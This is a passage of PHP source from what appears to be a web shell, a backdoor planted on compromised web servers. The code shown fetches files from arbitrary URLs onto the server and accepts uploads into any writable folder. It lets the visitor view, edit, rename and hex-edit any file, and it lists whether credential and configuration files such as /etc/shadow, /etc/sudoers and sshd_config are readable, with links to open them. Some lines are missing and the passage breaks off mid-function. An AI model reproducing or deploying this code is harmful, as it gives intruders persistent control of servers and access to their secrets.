1563                $s_st = dlfile($s_fu,$s_fp);
1564                if($s_st) $s_msg .= notif("File uploaded to &lt;a href='".$s_self."view=".$s_fp."'&gt;".$s_fp."&lt;/a&gt;");
1565                else $s_msg .= notif("Failed to upload ".$s_fn);
1566            }
1567        }
1568        else{
1569            if(!@is_writable($s_cwd)) $s_msg = notif("Directory ".$s_cwd." is not writable, please change to a writable one");
1570        }
1571 
1572        if(!empty($s_msg)) $s_result .= $s_msg;
1573        $s_result .= "
1574           &lt;form action='".$s_self."' method='post' enctype='multipart/form-data'&gt;
1575           &lt;div class='mybox'&gt;&lt;h2&gt;&lt;div class='but' onclick='adduploadc();'&gt;+&lt;/div&gt;Upload from computer&lt;/h2&gt;
1576           &lt;table class='myboxtbl'&gt;
1577           &lt;tbody id='adduploadc'&gt;
1578           &lt;tr&gt;&lt;td style='width:140px;'&gt;File&lt;/td&gt;&lt;td&gt;&lt;input type='file' name='filepath[]' class='inputzbut' style='width:400px;margin:0;' /&gt;&lt;/td&gt;&lt;/tr&gt;
1579           &lt;tr&gt;&lt;td&gt;Save to&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='savefolder[]' value='".$s_cwd."' /&gt;&lt;/td&gt;&lt;/tr&gt;
1580           &lt;tr&gt;&lt;td&gt;Filename (optional)&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='savefilename[]' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;
1581           &lt;/tbody&gt;
1582           &lt;tfoot&gt;
1583           &lt;tr&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;td&gt;
1584           &lt;input type='submit' name='uploadhd' class='inputzbut' value='Upload !' style='width:120px;height:30px;margin:10px 2px 0 2px;' /&gt;
1585           &lt;input type='hidden' name='x' value='upload' /&gt;
1586           &lt;/td&gt;&lt;/tr&gt;
1587           &lt;/tfoot&gt;
1588           &lt;/table&gt;
1589           &lt;/div&gt;
1590           &lt;/form&gt;
1591           &lt;form action='".$s_self."' method='post'&gt;
1592           &lt;div class='mybox'&gt;&lt;h2&gt;&lt;div class='but' onclick='adduploadi();'&gt;+&lt;/div&gt;Upload from internet&lt;/h2&gt;
1593           &lt;table class='myboxtbl'&gt;
1594           &lt;tbody id='adduploadi'&gt;
1595           &lt;tr&gt;&lt;td style='width:150px;'&gt;File URL&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='fileurl[]' value='' /&gt;
1596           &lt;/td&gt;&lt;/tr&gt;
1597           &lt;tr&gt;&lt;td&gt;Save to&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='savefolderurl[]' value='".$s_cwd."' /&gt;&lt;/td&gt;&lt;/tr&gt;
1598           &lt;tr&gt;&lt;td&gt;Filename (optional)&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='savefilenameurl[]' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;
1599           &lt;/tbody&gt;
1600           &lt;tfoot&gt;
1601           &lt;tr&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;td&gt;
1602           &lt;input type='submit' name='uploadurl' class='inputzbut' value='Upload !' style='width:120px;height:30px;margin:10px 2px 0 2px;' /&gt;
1603           &lt;input type='hidden' name='x' value='upload' /&gt;
1604           &lt;/td&gt;&lt;/tr&gt;
1605           &lt;/table&gt;
1606           &lt;/div&gt;
1607           &lt;/form&gt;";
1608    } // view file
1609    elseif(isset($_GP['view'])){
1610        $s_f = $_GP['view'];
1611        if(isset($s_fnew) && (trim($s_fnew)!="")) $s_f = $s_fnew;
1612 
1613        $s_owner = "";
1614        if(@is_file($s_f)){
1615            $targetdir = dirname($s_f);
1616            chdir($targetdir);
1617            $s_cwd = cp(getcwd());
1618            setcookie("cwd", $s_cwd ,time() + $s_login_time);
1619 
1620            if(!$s_win && $s_posix){
1621                $s_name = posix_getpwuid(fileowner($s_f));
1622                $s_group = posix_getgrgid(filegroup($s_f));
1623                $s_owner = "&lt;tr&gt;&lt;td&gt;Owner&lt;/td&gt;&lt;td&gt;".$s_name['name']."&lt;span class='gaya'&gt;:&lt;/span&gt;".$s_group['name']."&lt;/td&gt;&lt;/tr&gt;";
1624            }
1625            $s_filn = basename($s_f);
1626            $s_dlfile = get_archiver_available();
1627            $s_dlfile = str_replace("__dlpath__",$s_filn,$s_dlfile);
1628            $s_dlfile = str_replace("__dlcwd__",$s_cwd,$s_dlfile);
1629            $s_result .= "&lt;table class='viewfile' style='width:100%;'&gt;
1630           &lt;tr&gt;&lt;td style='width:140px;'&gt;Filename&lt;/td&gt;&lt;td&gt;&lt;span id='".cs($s_filn)."_link'&gt;".$s_f."&lt;/span&gt;
1631           &lt;div id='".cs($s_filn)."_form' class='sembunyi'&gt;
1632           &lt;form action='".$s_self."' method='post'&gt;
1633               &lt;input type='hidden' name='oldname' value='".$s_f."' style='margin:0;padding:0;' /&gt;
1634               &lt;input type='hidden' name='view' value='".$s_f."' /&gt;
1635               &lt;input class='inputz' style='width:200px;' type='text' name='rename' value='".$s_f."' /&gt;
1636               &lt;input class='inputzbut' type='submit' value='rename' /&gt;
1637           &lt;/form&gt;
1638           &lt;input class='inputzbut' type='button' value='x' onclick=\"tukar_('".cs($s_filn)."_form','".cs($s_filn)."_link');\" /&gt;
1639           &lt;/div&gt;
1640           &lt;/td&gt;&lt;/tr&gt;
1641           &lt;tr&gt;&lt;td&gt;Size&lt;/td&gt;&lt;td&gt;".gs($s_f)." (".@filesize($s_f).")&lt;/td&gt;&lt;/tr&gt;
1642           &lt;tr&gt;&lt;td&gt;Permission&lt;/td&gt;&lt;td&gt;".gp($s_f)."&lt;/td&gt;&lt;/tr&gt;
1643           ".$s_owner."
1644           &lt;tr&gt;&lt;td&gt;Create time&lt;/td&gt;&lt;td&gt;".@date("d-M-Y H:i:s",filectime($s_f))."&lt;/td&gt;&lt;/tr&gt;
1645           &lt;tr&gt;&lt;td&gt;Last modified&lt;/td&gt;&lt;td&gt;".@date("d-M-Y H:i:s",filemtime($s_f))."&lt;/td&gt;&lt;/tr&gt;
1646           &lt;tr&gt;&lt;td&gt;Last accessed&lt;/td&gt;&lt;td&gt;".@date("d-M-Y H:i:s",fileatime($s_f))."&lt;/td&gt;&lt;/tr&gt;
1647           &lt;tr&gt;&lt;td&gt;Actions&lt;/td&gt;&lt;td&gt;
1648           &lt;a href='".$s_self."edit=".$s_f."' title='edit'&gt;edit&lt;/a&gt; | &lt;a href='".$s_self."hexedit=".$s_f."' title='edit as hex'&gt;hex&lt;/a&gt; | &lt;a href=\"javascript:tukar_('".cs($s_filn)."_link','".cs($s_filn)."_form');\" title='rename'&gt;ren&lt;/a&gt; | &lt;a href='".$s_self."del=".$s_f."' title='delete'&gt;del&lt;/a&gt; ".$s_dlfile."
1649           &lt;/td&gt;&lt;/tr&gt;
1650           &lt;tr&gt;&lt;td&gt;View&lt;/td&gt;&lt;td&gt;
1651           &lt;a href='".$s_self."view=".$s_f."&type=text'&gt;text&lt;/a&gt; | &lt;a href='".$s_self."view=".$s_f."&type=code'&gt;code&lt;/a&gt; | &lt;a href='".$s_self."view=".$s_f."&type=image'&gt;image&lt;/a&gt; | &lt;a href='".$s_self."view=".$s_f."&type=audio'&gt;audio&lt;/a&gt; | &lt;a href='".$s_self."view=".$s_f."&type=video'&gt;video&lt;/a&gt;
1652           &lt;/td&gt;&lt;/tr&gt;
1653           &lt;/table&gt;";
1654 
1655            $s_t = ""; $s_mime = "";
1656            $s_mime_list = gzinflate(base64_decode($s_mime_types));
1657            $s_ext_pos = strrpos($s_f, ".");
1658            if($s_ext_pos!==false){
1659                $s_ext = trim(substr($s_f, $s_ext_pos),".");
1660                if(preg_match("/([^\s]+)\ .*\b".$s_ext."\b.*/i",$s_mime_list,$s_r)){
1661                    $s_mime = $s_r[1];
1662                }
1663            }
1664 
1665            $s_iinfo = @getimagesize($s_f);
1666            if(strtolower(substr($s_filn,-3,3)) == "php") $s_t = "code";
1667            elseif(is_array($s_iinfo)) $s_t = 'image';
1668            elseif(!empty($s_mime)) $s_t = substr($s_mime,0,strpos($s_mime,"/"));
1669 
1670            if(isset($_GP['type'])) $s_t = $_GP['type'];
1671 
1672            if($s_t=="image"){
1673                $s_width = (int) $s_iinfo[0];
1674                $s_height = (int) $s_iinfo[1];
1675                $s_imginfo = "Image type = ( ".$s_iinfo['mime']." )&lt;br /&gt;
1676                   Image Size = &lt;span class='gaul'&gt;( &lt;/span&gt;".$s_width." x ".$s_height."&lt;span class='gaul'&gt; )&lt;/span&gt;&lt;br /&gt;";
1677                if($s_width &gt; 800){
1678                    $s_width = 800;
1679                    $s_imglink = "&lt;p&gt;&lt;a href='".$s_self."img=".$s_filn."'&gt;
1680                   &lt;span class='gaul'&gt;[ &lt;/span&gt;view full size&lt;span class='gaul'&gt; ]&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;";
1681                }
1682                else $s_imglink = "";
1683 
1684                $s_result .= "&lt;div class='viewfilecontent' style='text-align:center;'&gt;".$s_imglink."
1685                   &lt;img width='".$s_width."' src='".$s_self."img=".$s_filn."' alt='".$s_filn."' style='margin:8px auto;padding:0;border:0;' /&gt;&lt;/div&gt;";
1686 
1687            }
1688            elseif($s_t=="code"){
1689                $s_result .= "&lt;div class=\"viewfilecontent\"&gt;";
1690                $s_file = wordwrap(@file_get_contents($s_f),160,"\n",true);
1691                $s_buff = highlight_string($s_file,true);
1692                $s_old = array("0000BB", "000000", "FF8000", "DD0000", "007700");
1693                $s_new = ($s_theme=="bright")? $s_highlight_bright:$s_highlight_dark;
1694                $s_buff = str_replace($s_old,$s_new, $s_buff);
1695                $s_result .= $s_buff;
1696                $s_result .=  "&lt;/div&gt;";
1697            }
1698            elseif($s_t=="audio" || $s_t=="video"){
1699                $s_result .= "&lt;div class='viewfilecontent' style='text-align:center;'&gt;
1700                           &lt;".$s_t." controls&gt;
1701                           &lt;source src='".$s_self."dltype=raw&dlpath=".$s_f."' type='".$s_mime."'&gt;
1702                               &lt;object data='".$s_self."dltype=raw&dlpath=".$s_f."'&gt;
1703                                   &lt;embed src='".$s_self."dltype=raw&dlpath=".$s_f."'&gt;
1704                               &lt;/object&gt;
1705                           &lt;/".$s_t."&gt;
1706                           &lt;/div&gt;";
1707            }
1708            else {
1709                $s_result .= "&lt;pre style='padding: 3px 8px 0 8px;' class='viewfilecontent'&gt;";
1710                $s_result .=  str_replace("&lt;", "&lt;",str_replace("&gt;", "&gt;",(wordwrap(@file_get_contents($s_f),160,"\n",true))));
1711                $s_result .=   "&lt;/pre&gt;";
1712            }
1713        }
1714        elseif(@is_dir($s_f)){
1715            chdir($s_f);
1716            $s_cwd = cp(getcwd());
1717            setcookie("cwd", $s_cwd ,time() + $s_login_time);
1718            $s_result .= showdir($s_cwd);
1719        }
1720        else $s_result .= notif("Cannot find the path specified ".$s_f);
1721 
1722    } // edit file
1723    elseif(isset($_GP['edit'])){
1724        $s_f = $_GP['edit'];
1725        $s_fc = ""; $s_fcs = "";
1726 
1727        if(isset($_GP['new']) && ($_GP['new']=='yes')){
1728            $s_num = 1;
1729            if(@is_file($s_f)){
1730                $s_pos = strrpos($s_f,"_");
1731                if($s_pos!==false) $s_num = (int) substr($s_f,$s_pos+1);
1732                while(@is_file(substr($s_f,0,$s_pos)."_".$s_num)){
1733                    $s_num++;
1734                }
1735                $s_f = substr($s_f,0,$s_pos)."_".$s_num;
1736            }
1737        }
1738        else if(@is_file($s_f)) $s_fc = @file_get_contents($s_f);
1739 
1740        if(isset($_GP['fc'])){
1741            $s_fc = $_GP['fc'];
1742            $s_eol = $_GP['eol'];
1743            $s_eolf = pack("H*", geol($s_fc));
1744            $s_eolh = pack("H*", $s_eol);
1745            $s_fc = str_replace($s_eolf, $s_eolh, $s_fc);
1746 
1747            if($s_filez = fopen($s_f,"w")){
1748                $s_time = @date("d-M-Y H:i:s",time());
1749                if(fwrite($s_filez,$s_fc)!==false) $s_fcs = "File saved @ ".$s_time;
1750                else $s_fcs = "Failed to save";
1751                fclose($s_filez);
1752            }
1753            else $s_fcs = "Permission denied";
1754        }
1755        elseif(@is_file($s_f) && !@is_writable($s_f)) $s_fcs = "This file is not writable";
1756 
1757        $s_eol = geol($s_fc);
1758 
1759        if(!empty($s_fcs)) $s_result .= notif($s_fcs);
1760        $s_result .= "&lt;form action='".$s_self."' method='post'&gt;
1761               &lt;textarea id='fc' name='fc' class='txtarea'&gt;".hss($s_fc)."&lt;/textarea&gt;
1762               &lt;p style='text-align:center;'&gt;&lt;input type='text' class='inputz' style='width:99%;' name='edit' value='".$s_f."' /&gt;&lt;/p&gt;
1763               &lt;p&gt;&lt;input type='submit' name='fcsubmit' class='inputzbut' value='Save !' style='width:120px;height:30px;' /&gt;&lt;/p&gt;
1764               &lt;input type='hidden' name='eol' value='".$s_eol."' /&gt;
1765               &lt;/form&gt;";
1766 
1767    } // hex edit file
1768    elseif(isset($_GP['hexedit'])){
1769        $s_f = $_GP['hexedit'];
1770        $s_fc = ""; $s_fcs = ""; $s_hexes = "";
1771        $s_lnum = 0;
1772 
1773        if(!empty($_GP['hexes']) || !empty($_GP['hexestxtarea'])){
1774            if(!empty($_GP['hexes'])){
1775                foreach($_GP['hexes'] as $s_hex) $s_hexes .= str_replace(" ", "", $s_hex);
1776            }
1777            elseif(!empty($_GP['hexestxtarea'])){
1778                $s_hexes = trim($_GP['hexestxtarea']);
1779            }
1780            if($s_filez = fopen($s_f,"w")){
1781                    $s_bins = pack("H*", $s_hexes);
1782                    $s_time = @date("d-M-Y H:i:s", time());
1783                    if(fwrite($s_filez,$s_bins)!==false) $s_fcs = "File saved @ ".$s_time;
1784                    else $s_fcs = "Failed to save";

1786                }
1787            else $s_fcs = "Permission denied";
1788        }

1795                   &lt;p class='border-bottom' style='padding:0 0 14px 0;'&gt;&lt;input type='submit' name='fcsubmit' class='inputzbut' value='Save !' style='width:120px;height:30px;' onclick=\"return submithex();\" /&gt;&lt;/p&gt;
1796                   &lt;table class='explore'&gt;";
1797 
1798        if(@is_file($s_f)){
1799            $s_fp = fopen($s_f, "r");
1800            if($s_fp) {
1801                $s_ldump = "";
1802                $s_counter = 0;
1803                $s_icounter = 0;
1804                while(!feof($s_fp)){
1805                    $s_line = fread($s_fp, 32);
1806                    $s_linehex = strtoupper(bin2hex($s_line));
1807                    $s_linex = str_split($s_linehex, 2);
1808                    $s_linehex = implode(" ", $s_linex);
1809                    $s_addr = sprintf("%08xh", $s_icounter);
1810 
1811                    $s_result .= "&lt;tr&gt;&lt;td style='text-align:center;width:60px;'&gt;".$s_addr."&lt;/td&gt;&lt;td style='text-align:left;width:594px;'&gt;
1812                   &lt;input onselect='this.selectionEnd=this.selectionStart;' onclick=\"hexupdate('".$s_counter."',event);\" onkeydown=\"return hexfix('".$s_counter."',event);\" onkeyup=\"hexupdate('".$s_counter."',event);\" type='text' class='inputz' id='hex_".$s_counter."' name='hexes[]' value='".$s_linehex."' style='width:578px;' maxlength='".strlen($s_linehex)."' /&gt;&lt;/td&gt;
1813                   &lt;td style='text-align:left;letter-spacing:2px;'&gt;
1814                   &lt;pre name='hexdump' id='dump_".$s_counter."' style='margin:0;padding:0;'&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;";
1815                    $s_counter++;
1816                    $s_icounter+=32;
1817                }
1818                $s_result .= "&lt;input type='hidden' id='counter' value='".$s_counter."' /&gt;";
1819                $s_result .= "&lt;textarea name='hexestxtarea' id='hexestxtarea' class='sembunyi'&gt;&lt;/textarea&gt;";
1820                fclose($s_fp);
1821            }
1822        }
1823        $s_result .= "&lt;/table&gt;&lt;/form&gt;";
1824 
1825    } // show server information
1826    elseif(isset($_GP['x']) && ($_GP['x']=='info')){
1827        $s_result = "";
1828        // server misc info
1829        $s_result .= "&lt;p class='notif' onclick=\"toggle('info_server')\"&gt;Server Info&lt;/p&gt;";
1830        $s_result .= "&lt;div class='info' id='info_server'&gt;&lt;table&gt;";
1831

1837                }
1838            }
1839        }
1840        else $s_result .= "&lt;tr&gt;&lt;td&gt;root partition&lt;/td&gt;&lt;td&gt;".ts(@disk_free_space("/"))." free of ".ts(@disk_total_space("/"))."&lt;/td&gt;&lt;/tr&gt;";
1841

1844        foreach($s_access as $s){
1845            $s_t = explode("_", $s);
1846            if(isset($$s)) $s_result .= "&lt;tr&gt;&lt;td&gt;".$s_t[1]."&lt;/td&gt;&lt;td&gt;".$$s."&lt;/td&gt;&lt;/tr&gt;";
1847        }
1848 
1849        if(!$s_win){
1850            $s_interesting = array(
1851            "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/issue", "/etc/issue.net", "/etc/motd", "/etc/sudoers", "/etc/hosts", "/etc/aliases",
1852            "/proc/version", "/etc/resolv.conf", "/etc/sysctl.conf",
1853            "/etc/named.conf", "/etc/network/interfaces", "/etc/squid/squid.conf", "/usr/local/squid/etc/squid.conf",
1854            "/etc/ssh/sshd_config",
1855            "/etc/httpd/conf/httpd.conf", "/usr/local/apache2/conf/httpd.conf", " /etc/apache2/apache2.conf", "/etc/apache2/httpd.conf", "/usr/pkg/etc/httpd/httpd.conf", "/usr/local/etc/apache22/httpd.conf", "/usr/local/etc/apache2/httpd.conf", "/var/www/conf/httpd.conf", "/etc/apache2/httpd2.conf", "/etc/httpd/httpd.conf",
1856            "/etc/lighttpd/lighttpd.conf", "/etc/nginx/nginx.conf",
1857            "/etc/fstab", "/etc/mtab", "/etc/crontab", "/etc/inittab", "/etc/modules.conf", "/etc/modules");
1858            foreach($s_interesting as $s_f){
1859                if(@is_file($s_f) && @is_readable($s_f)) $s_result .= "&lt;tr&gt;&lt;td&gt;".$s_f."&lt;/td&gt;&lt;td&gt;&lt;a href='".$s_self."view=".$s_f."'&gt;".$s_f." is readable&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;";
1860            }
1861        }
1862        $s_result .= "&lt;/table&gt;&lt;/div&gt;";
1863 
1864        if(!$s_win){
1865            // cpu info
1866            if($s_i_buff=trim(@file_get_contents("/proc/cpuinfo"))){
1867                $s_result .= "&lt;p class='notif' onclick=\"toggle('info_cpu')\"&gt;CPU Info&lt;/p&gt;";
1868                $s_result .= "&lt;div class='info' id='info_cpu'&gt;";
1869                $s_i_buffs = explode("\n\n", $s_i_buff);
1870                foreach($s_i_buffs as $s_i_buffss){
1871                    $s_i_buffss = trim($s_i_buffss);
1872                    if($s_i_buffss!=""){

1874                        $s_result .= "&lt;table&gt;";
1875                        foreach($s_i_buffsss as $s_i){
1876                            $s_i = trim($s_i);

1878                                $s_ii = explode(":",$s_i);
1879                                if(count($s_ii)==2) $s_result .= "&lt;tr&gt;&lt;td&gt;".$s_ii[0]."&lt;/td&gt;&lt;td&gt;".$s_ii[1]."&lt;/td&gt;&lt;/tr&gt;";
1880                            }
1881                        }
1882                        $s_result .= "&lt;/table&gt;";
1883                    }
1884                }
1885                $s_result .= "&lt;/div&gt;";
1886            }
1887 
1888            // mem info
1889            if($s_i_buff=trim(@file_get_contents("/proc/meminfo"))){

1891                $s_i_buffs = explode("\n", $s_i_buff);
1892                $s_result .= "&lt;div class='info' id='info_mem'&gt;&lt;table&gt;";
